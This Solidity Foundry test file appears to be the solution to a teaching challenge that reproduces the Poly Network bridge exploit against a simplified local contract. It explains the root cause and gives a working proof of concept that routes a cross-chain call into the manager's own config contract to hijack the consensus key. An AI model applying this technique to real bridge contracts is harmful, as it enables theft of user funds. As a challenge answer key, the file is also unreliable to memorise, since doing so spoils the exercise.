// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {CrossChainManager, CrossChainData} from "../src/PolyNetworkCrossChain.sol";

/// @title Challenge 01 — SOLUTION — Poly Network: Cross-Chain Call Reaches the Manager's Own Config Contract
///
/// ROOT CAUSE
///   `verifyHeaderAndExecuteTx` proves a message is genuine (header + Merkle inclusion in the
///   real protocol; a simplified stand-in here), then calls `toContract` with caller-named
///   calldata. It never excludes the manager's OWN trusted configuration contract from the set
///   of valid targets. Since `msg.sender` during that call is the manager itself, and the
///   manager genuinely IS `dataContract`'s owner, `onlyOwner` is satisfied -- correctly, by the
///   letter of the check, for entirely the wrong reason. The manager isn't being tricked into
///   thinking it's the owner; it simply IS, and nothing stops a "cross-chain transaction" from
///   being aimed at the one contract whose owner-only functions control the ENTIRE system's
///   trust root.
contract PolyNetworkSolution is Test {
    CrossChainManager public manager;
    CrossChainData public dataContract;

    address public player = makeAddr("player");

    function setUp() public {
        dataContract = new CrossChainData(address(this));
        manager = new CrossChainManager(dataContract);
        dataContract.transferOwnership(address(manager));
    }

    function test_exploit_solution() public {
        vm.startPrank(player);

        // Step 1: the "method" and "args" fields of a cross-chain message are just strings/
        // bytes as far as the manager is concerned -- craft them to call
        // putCurEpochConPubKeyBytes(bytes) with our own address as the new "key".
        string memory method = "putCurEpochConPubKeyBytes(bytes)";
        bytes memory newKey = abi.encodePacked(player);
        bytes memory args = abi.encode(newKey);

        // Step 2: name dataContract itself as the destination. Any non-empty `proof` clears the
        // simplified _verifyProof check.
        manager.verifyHeaderAndExecuteTx(address(dataContract), bytes(method), args, hex"01");

        vm.stopPrank();

        bytes memory currentKey = dataContract.getCurEpochConPubKeyBytes();
        console.log("Consensus key hijacked to player address:");
        console.logBytes(currentKey);

        // ------------------------------------------------------------------------------
        // Result: the trusted consensus key -- which every future cross-chain message's
        // header verification depends on -- is now player-controlled. In the real incident
        // this step alone was what let the attacker forge arbitrary subsequent messages.
        // ------------------------------------------------------------------------------
        assertEq(currentKey, abi.encodePacked(player), "exploit failed: key was not hijacked");
    }
}
